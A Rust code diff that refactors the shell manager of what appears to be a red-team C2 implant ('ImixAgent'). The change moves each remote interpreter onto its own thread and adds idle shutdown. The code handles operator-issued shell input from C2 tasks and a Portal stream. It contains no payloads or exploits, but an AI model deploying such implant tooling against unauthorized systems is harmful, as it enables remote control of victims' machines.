@@ -57,10 +57,6 @@ impl SharedShellContext {
     fn clear_task(&self) {
         let mut ctx = self.0.lock().unwrap();
         ctx.task_id = None;
-        // Should we clear seq_id/stream_id?
-        // For C2 tasks, yes.
-        // For Portal, we might want to keep the session context, but `set_portal` overwrites it anyway.
-        // Let's clear them to avoid accidental reuse for next C2 task.
         ctx.seq_id = None;
         ctx.stream_id = None;
     }
@@ -92,7 +88,6 @@ fn send_shell_output<T: Transport + Send + Sync + 'static>(
     // 2. Report to Portal if active
     if let Some(tx) = &ctx.portal_tx {
         let stream_id = ctx.stream_id.clone().unwrap_or_default();
-        // Use the seq_id from the incoming message to reply to the correct sequence/stream
         let seq_id = ctx.seq_id.unwrap_or(0);
 
         let payload = ShellPayload {
@@ -138,7 +133,6 @@ fn send_shell_error<T: Transport + Send + Sync + 'static>(
         let stream_id = ctx.stream_id.clone().unwrap_or_default();
         let seq_id = ctx.seq_id.unwrap_or(0);
 
-        // Prefix error
         let payload = ShellPayload {
             shell_id,
             input: format!("Error: {}", error),
@@ -184,16 +178,32 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
     }
 }
 
-pub struct ShellManager<T: Transport + Send + Sync + 'static> {
-    agent: Arc<ImixAgent<T>>,
-    interpreters: HashMap<i64, InterpreterState>,
-    rx: mpsc::Receiver<ShellManagerMessage>,
+// Commands sent to the dedicated interpreter thread
+pub enum InterpreterCommand {
+    ExecuteTask {
+        task_id: i64,
+        input: String,
+        sequence_id: u64,
+        stream_id: String,
+    },
+    ExecutePortal {
+        input: String,
+        stream_id: String,
+        seq_id: u64,
+        reply_tx: mpsc::Sender<Mote>,
+    },
+    Shutdown,
 }
 
-struct InterpreterState {
-    interpreter: Interpreter,
-    context: SharedShellContext,
+struct InterpreterHandle {
+    tx: mpsc::Sender<InterpreterCommand>,
     last_activity: Instant,
+}
+
+pub struct ShellManager<T: Transport + Send + Sync + 'static> {
+    agent: Arc<ImixAgent<T>>,
+    interpreters: HashMap<i64, InterpreterHandle>,
+    rx: mpsc::Receiver<ShellManagerMessage>,
 }
 
 impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
@@ -228,41 +238,141 @@ impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
                     }
                 }
                 _ = cleanup_timer.tick() => {
-                    self.cleanup_inactive_interpreters();
+                    self.cleanup_inactive_interpreters().await;
                 }
             }
         }
     }
 
     async fn handle_task(&mut self, task: ShellTask) {
-        let agent = self.agent.clone();
-        let shell_id = task.shell_id;
-        let state = self.get_or_create_interpreter(shell_id);
+        self.ensure_interpreter(task.shell_id);
 
-        state.last_activity = Instant::now();
-        state
-            .context
-            .set_task(task.id, task.sequence_id, task.stream_id);
+        if let Some(handle) = self.interpreters.get_mut(&task.shell_id) {
+            handle.last_activity = Instant::now();
+            let _ = handle
+                .tx
+                .send(InterpreterCommand::ExecuteTask {
+                    task_id: task.id,
+                    input: task.input,
+                    sequence_id: task.sequence_id,
+                    stream_id: task.stream_id,
+                })
+                .await;
+        }
+    }
 
-        let input = task.input.clone();
-        let interpreter = &mut state.interpreter;
+    async fn handle_portal_payload(&mut self, mote: Mote, reply_tx: mpsc::Sender<Mote>) {
+        if let Some(portal::mote::Payload::Shell(shell_payload)) = mote.payload {
+            let shell_id = shell_payload.shell_id;
+            self.ensure_interpreter(shell_id);
 
-        let result = panic::catch_unwind(AssertUnwindSafe(move || interpreter.interpret(&input)));
+            if let Some(handle) = self.interpreters.get_mut(&shell_id) {
+                handle.last_activity = Instant::now();
+                let _ = handle
+                    .tx
+                    .send(InterpreterCommand::ExecutePortal {
+                        input: shell_payload.input,
+                        stream_id: mote.stream_id,
+                        seq_id: mote.seq_id,
+                        reply_tx,
+                    })
+                    .await;
+            }
+        }
+    }
+
+    fn ensure_interpreter(&mut self, shell_id: i64) {
+        if !self.interpreters.contains_key(&shell_id) {
+            let (tx, rx) = mpsc::channel(32);
+            let agent = self.agent.clone();
+
+            // Spawn the long-running blocking task
+            tokio::task::spawn_blocking(move || {
+                Self::run_interpreter_loop(agent, shell_id, rx);
+            });
+
+            self.interpreters.insert(
+                shell_id,
+                InterpreterHandle {
+                    tx,
+                    last_activity: Instant::now(),
+                },
+            );
+        }
+    }
+
+    // This runs in a dedicated blocking thread
+    fn run_interpreter_loop(
+        agent: Arc<ImixAgent<T>>,
+        shell_id: i64,
+        mut rx: mpsc::Receiver<InterpreterCommand>,
+    ) {
+        let context = SharedShellContext::new();
+        let printer = Arc::new(ShellPrinter {
+            agent: agent.clone(),
+            context: context.clone(),
+            shell_id,
+        });
+
+        // Create dummy TaskContext
+        let task_context = TaskContext {
+            task_id: 0,
+            jwt: String::new(),
+        };
+
+        let backend = Arc::new(EmptyAssets {});
+
+        let mut interpreter = Interpreter::new_with_printer(printer)
+            .with_default_libs()
+            .with_task_context(agent.clone(), task_context, Vec::new(), backend);
+
+        // Process commands
+        while let Some(cmd) = rx.blocking_recv() {
+            match cmd {
+                InterpreterCommand::ExecuteTask {
+                    task_id,
+                    input,
+                    sequence_id,
+                    stream_id,
+                } => {
+                    context.set_task(task_id, sequence_id, stream_id);
+                    Self::execute_interpret(&mut interpreter, &input, &agent, &context, shell_id);
+                    context.clear_task();
+                }
+                InterpreterCommand::ExecutePortal {
+                    input,
+                    stream_id,
+                    seq_id,
+                    reply_tx,
+                } => {
+                    context.set_portal(reply_tx, stream_id, seq_id);
+                    Self::execute_interpret(&mut interpreter, &input, &agent, &context, shell_id);
+                }
+                InterpreterCommand::Shutdown => {
+                    break;
+                }
+            }
+        }
+    }
+
+    fn execute_interpret(
+        interpreter: &mut Interpreter,
+        input: &str,
+        agent: &Arc<ImixAgent<T>>,
+        context: &SharedShellContext,
+        shell_id: i64,
+    ) {
+        let result = panic::catch_unwind(AssertUnwindSafe(|| interpreter.interpret(input)));
 
         match result {
             Ok(interpret_result) => match interpret_result {
                 Ok(value) => {
                     if !matches!(value, Value::None) {
-                        send_shell_output(
-                            &agent,
-                            &state.context,
-                            shell_id,
-                            format!("{:?}\n", value),
-                        );
+                        send_shell_output(agent, context, shell_id, format!("{:?}\n", value));
                     }
                 }
                 Err(e) => {
-                    send_shell_error(&agent, &state.context, shell_id, e);
+                    send_shell_error(agent, context, shell_id, e);
                 }
             },
             Err(e) => {
@@ -279,101 +389,29 @@ impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
                 } else {
                     "Critical Error: Panic occurred during shell execution".to_string()
                 };
-                send_shell_error(&agent, &state.context, shell_id, msg);
-            }
-        }
-
-        state.context.clear_task();
-    }
-
-    async fn handle_portal_payload(&mut self, mote: Mote, reply_tx: mpsc::Sender<Mote>) {
-        if let Some(portal::mote::Payload::Shell(shell_payload)) = mote.payload {
-            let agent = self.agent.clone();
-            let shell_id = shell_payload.shell_id;
-            let stream_id = mote.stream_id.clone();
-            let seq_id = mote.seq_id;
-
-            let state = self.get_or_create_interpreter(shell_id);
-
-            state.last_activity = Instant::now();
-            state.context.set_portal(reply_tx, stream_id, seq_id);
-
-            let input = shell_payload.input.clone();
-            let interpreter = &mut state.interpreter;
-
-            let result =
-                panic::catch_unwind(AssertUnwindSafe(move || interpreter.interpret(&input)));
-
-            match result {
-                Ok(interpret_result) => match interpret_result {
-                    Ok(value) => {
-                        if !matches!(value, Value::None) {
-                            send_shell_output(
-                                &agent,
-                                &state.context,
-                                shell_id,
-                                format!("{:?}\n", value),
-                            );
-                        }
-                    }
-                    Err(e) => {
-                        send_shell_error(&agent, &state.context, shell_id, e);
-                    }
-                },
-                Err(e) => {
-                    let msg = if let Some(s) = e.downcast_ref::<&str>() {
-                        format!(
-                            "Critical Error: Panic occurred during shell execution: {}",
-                            s
-                        )
-                    } else if let Some(s) = e.downcast_ref::<String>() {
-                        format!(
-                            "Critical Error: Panic occurred during shell execution: {}",
-                            s
-                        )
-                    } else {
-                        "Critical Error: Panic occurred during shell execution".to_string()
-                    };
-                    send_shell_error(&agent, &state.context, shell_id, msg);
-                }
+                send_shell_error(agent, context, shell_id, msg);
             }
         }
     }
 
-    fn get_or_create_interpreter(&mut self, shell_id: i64) -> &mut InterpreterState {
-        self.interpreters.entry(shell_id).or_insert_with(|| {
-            let context = SharedShellContext::new();
-            let printer = Arc::new(ShellPrinter {
-                agent: self.agent.clone(),
-                context: context.clone(),
-                shell_id,
-            });
-
-            // Create dummy TaskContext
-            let task_context = TaskContext {
-                task_id: 0,
-                jwt: String::new(),
-            };
-
-            let backend = Arc::new(EmptyAssets {});
-
-            let interpreter = Interpreter::new_with_printer(printer)
-                .with_default_libs()
-                .with_task_context(self.agent.clone(), task_context, Vec::new(), backend);
-
-            InterpreterState {
-                interpreter,
-                context,
-                last_activity: Instant::now(),
-            }
-        })
-    }
-
-    fn cleanup_inactive_interpreters(&mut self) {
+    async fn cleanup_inactive_interpreters(&mut self) {
         let now = Instant::now();
         let timeout = Duration::from_secs(3600); // 1 hour
-        self.interpreters
-            .retain(|_, state| now.duration_since(state.last_activity) < timeout);
+
+        let mut to_remove = Vec::new();
+
+        for (id, handle) in self.interpreters.iter() {
+            if now.duration_since(handle.last_activity) >= timeout {
+                to_remove.push(*id);
+            }
+        }
+
+        for id in to_remove {
+            if let Some(handle) = self.interpreters.remove(&id) {
+                // Send explicit shutdown (optional since dropping tx also works)
+                let _ = handle.tx.send(InterpreterCommand::Shutdown).await;
+            }
+        }
     }
 }
 
@@ -393,7 +431,6 @@ mod tests {
         let config = Config::default();
         let mut transport = MockTransport::default();
         // We expect report_task_output to be called with the result "2\n" for input "1+1"
-        // Note: The interpreter formats output with {:?}\n, so 2 becomes "2\n"
         transport
             .expect_report_task_output()
             .withf(|req| {
@@ -432,9 +469,10 @@ mod tests {
             .unwrap();
 
         // Run manager for a bit
+        // We need to give enough time for the message to cross to the other thread, execute, and report back
         tokio::select! {
             _ = manager.run() => {},
-            _ = tokio::time::sleep(Duration::from_millis(500)) => {},
+            _ = tokio::time::sleep(Duration::from_millis(1000)) => {},
         }
 
         // Flush outputs to ensure transport mock is called
